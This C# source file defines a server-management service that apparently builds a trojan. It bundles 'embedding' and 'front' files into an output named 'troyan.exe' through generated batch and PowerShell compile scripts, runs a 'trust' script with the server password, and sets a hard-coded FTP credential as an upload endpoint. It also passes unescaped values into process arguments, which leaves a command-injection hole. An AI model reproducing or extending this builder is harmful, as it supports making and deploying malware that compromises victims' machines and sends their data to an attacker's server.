using System.Diagnostics;
using System.Text;
using System.Text.Json;


namespace model
{

    public class ServerResult
    {
        public ServerModel? ServerModel;

        public Exception? Exception;
    }

    public class ServerService
    {
        public ServerService()
        {

        }
        public string SysScript(string scriptName)
        {
            return Path.Combine(ServerModelLoader.SysDirStatic, scriptName + ".ps1");
        }

        public string ServerCompileBat(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "compile.bat");
        }

        private string ServerDir(string serverName)
        {
            return Path.Combine(ServerModelLoader.RootDataStatic, serverName);
        }

        public string EmbeddingsDir(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "embeddings");
        }

        public string FrontDir(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "front");
        }

        private string DataFile(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "server.json");
        }

        public string GetIcon(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "server.ico");
        }

        public string GetExe(string serverName)
        {
            return Path.Combine(ServerDir(serverName), "troyan.exe");
        }

        public string BuildExe(string serverName, string url)
        {
            return Path.Combine(ServerDir(serverName), "troyan.exe");
        }

        public string GetEmbedding(string serverName, string embeddingName)
        {
            return Path.Combine(EmbeddingsDir(serverName), embeddingName);
        }

        public void DeleteEmbedding(string serverName, string embeddingName)
        {
            File.Delete(GetEmbedding(serverName, embeddingName));
        }

        public string GetFront(string serverName, string embeddingName)
        {
            return Path.Combine(FrontDir(serverName), embeddingName);
        }

        public void DeleteFront(string serverName, string embeddingName)
        {
            File.Delete(GetFront(serverName, embeddingName));
        }

        public ServerResult GetServer(string serverName, bool create = false, string pass = "")
        {
            if (create)
            {
                if (!Directory.Exists(ServerDir(serverName)))
                    Directory.CreateDirectory(ServerDir(serverName));
            }

            if (!Directory.Exists(ServerDir(serverName)))
                return new ServerResult() { Exception = new DirectoryNotFoundException(serverName) };

            var server = new ServerModel();
            try
            {
                try
                {
                    server = JsonSerializer.Deserialize<ServerModel>(File.ReadAllText(DataFile(serverName)))!;
                }
                catch
                {
                    File.WriteAllText(DataFile(serverName),
                        JsonSerializer.Serialize(new ServerModel() { Server = serverName },
                            new JsonSerializerOptions() { WriteIndented = true }));
                }

                if (create && !string.IsNullOrEmpty(pass))
                    server.Password = pass;

                server.Server = serverName;

                RunScript(server, "trust",
                    new (string Name, object Value)[]
                    {
                        new ValueTuple<string, object>("serverName", server.Server),
                        new("serverPassword", server.Password)
                    });
                server.Interfaces = new PsList(server).Run().Where(a => a != server.Server).ToList();

                UpdateIpDomains(server);

                server.PrimaryDns = server.Interfaces[0];
                server.SecondaryDns = server.PrimaryDns;
                server.FtpUserData = $@"ftp://ftpdata:Abc12345!@{server.Interfaces.First(a => a != server.Server)}";
                if (server.Interfaces.Count >= 2)
                    server.SecondaryDns = server.Interfaces[1];

                server.Embeddings = new List<string>();
                if (Directory.Exists(EmbeddingsDir(serverName)))
                    server.Embeddings = Directory.GetFiles(EmbeddingsDir(serverName)).Select(a => Path.GetFileName(a))
                        .ToList();

                server.Front = new List<string>();
                if (Directory.Exists(FrontDir(serverName)))
                    server.Front = Directory.GetFiles(FrontDir(serverName)).Select(a => Path.GetFileName(a))
                        .ToList();

                File.WriteAllText(DataFile(serverName),
                    JsonSerializer.Serialize(server, new JsonSerializerOptions() { WriteIndented = true }));

                System.IO.File.WriteAllText(Path.Combine(ServerDir(serverName), "compile.bat"),
                    $@"
@echo off
echo Starting process...
powershell -File {ServerModelLoader.RootDirStatic}\cmpl\compile.ps1 -serverName {server.Server}");

                return new ServerResult() { ServerModel = server };
            }
            catch (Exception e)
            {
                server.Result = e.Message;
                return new ServerResult() { Exception = e, ServerModel = server };
            }
        }

        public void UpdateIpDomains(ServerModel server)
        {
            while (server.Domains.Count < server.Interfaces.Count)
                server.Domains.Add("test.com");
            var zippedDictionary = server.Interfaces
                .Zip(server.Domains, (iface, domain) => new { Interface = iface, Domain = domain })
                .Where(pair => server.Domains.Contains(pair.Domain))
                .ToDictionary(pair => pair.Interface, pair => pair.Domain);
            server.IpDomains = zippedDictionary;
        }

        public string PostServer(string serverName, ServerModel serverModel, string action)
        {
            if (!Directory.Exists(ServerDir(serverName)))
                return $"Server {serverName} is not registered";

            UpdateIpDomains(serverModel);

            File.WriteAllText(DataFile(serverName),
                JsonSerializer.Serialize(serverModel, new JsonSerializerOptions() { WriteIndented = true }));

            var result = RunCompileBat(serverModel);

            return result;
        }

        public string RunCompileBat(ServerModel serverModel)
        {
            var file = ServerCompileBat(serverModel.Server);
            var logFile = Path.Combine(ServerDir(serverModel.Server), "process.log");

            var processStartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = $"/c \"{file} > \"{logFile}\" 2>&1\"",
                UseShellExecute = false,
                CreateNoWindow = true,
                WorkingDirectory = ServerDir(serverModel.Server)
            };

            try
            {
                using (Process process = new Process { StartInfo = processStartInfo })
                {
                    process.Start();

                    // Wait for the process to exit
                    process.WaitForExit();
                }

                // Read the log file contents
                if (File.Exists(logFile))
                {
                    return File.ReadAllText(logFile);
                }
                else
                {
                    return "Log file not found.";
                }
            }
            catch (Exception ex)
            {
                return $"Error starting process: {ex.Message}";
            }
        }

        public string RunScript(ServerModel serverModel, string script, params (string Name, object Value)[] parameters)
        {
            var file = SysScript(script);
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "powershell.exe";
                process.StartInfo.Arguments = $"-file \"{file}\" " +
                                              string.Join(" ", parameters.Select(p => $"-{p.Name} {p.Value}"));
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.WorkingDirectory = ServerDir(serverModel.Server);

                StringBuilder output = new StringBuilder();
                StringBuilder error = new StringBuilder();

                process.OutputDataReceived += (sender, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        output.AppendLine(e.Data);
                    }
                };

                process.ErrorDataReceived += (sender, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        error.AppendLine(e.Data);
                    }
                };

                process.Start();

                process.BeginOutputReadLine();
                process.BeginErrorReadLine();

                process.WaitForExit();

                var res = error.ToString() + "\r\n" + output.ToString();

                return res;
            }
        }
    }
}